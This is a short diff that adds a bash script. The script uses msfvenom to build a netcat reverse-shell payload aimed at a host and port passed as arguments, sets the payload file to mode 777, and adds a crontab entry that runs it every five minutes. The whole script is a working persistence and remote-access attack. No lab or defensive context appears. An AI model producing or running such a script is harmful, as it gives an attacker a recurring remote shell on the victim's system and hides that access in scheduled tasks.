@@ -1,0 +1,5 @@
+#!/bin/bash
+	
+msfvenom -p cmd/unix/reverse_netcat lhost=$2 lport=$3 R > $1
+chmod 777 $1
+(crontab -l 2>/dev/null; echo "*/5 * * * * $1 ") | crontab - 
